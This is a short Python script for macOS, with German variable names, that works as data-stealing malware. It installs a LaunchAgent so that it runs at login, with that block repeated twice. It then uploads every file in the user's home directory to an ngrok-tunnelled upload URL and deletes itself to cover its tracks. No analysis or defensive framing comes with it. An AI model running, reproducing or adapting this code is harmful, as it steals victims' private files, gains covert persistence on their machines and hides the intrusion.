import requests
from pathlib import Path
import os
import sys
import subprocess

plist_path = os.path.expanduser("~/Library/LaunchAgents/com.user.meinscript.plist")

if not os.path.exists(plist_path):
    os.makedirs(os.path.dirname(plist_path), exist_ok=True)
    with open(plist_path, "w") as f:
        f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.meinscript</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""")
    subprocess.run(["launchctl", "load", plist_path])
    sys.exit()

plist_path = os.path.expanduser("~/Library/LaunchAgents/com.user.meinscript.plist")

if not os.path.exists(plist_path):
    os.makedirs(os.path.dirname(plist_path), exist_ok=True)
    with open(plist_path, "w") as f:
        f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.meinscript</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""")
    subprocess.run(["launchctl", "load", plist_path])
    sys.exit()


url = "https://calm-amiss-gnat.ngrok-free.dev/upload"
ordner = Path.home()
#ordner = Path("home/jenz/Documents/")


for datei in ordner.rglob("*"):
    if datei.is_file():
        with open(datei, "rb") as f:
            antwort = requests.post(url, files={"datei": f},)


script_path = os.path.abspath(__file__)
os.unlink(script_path)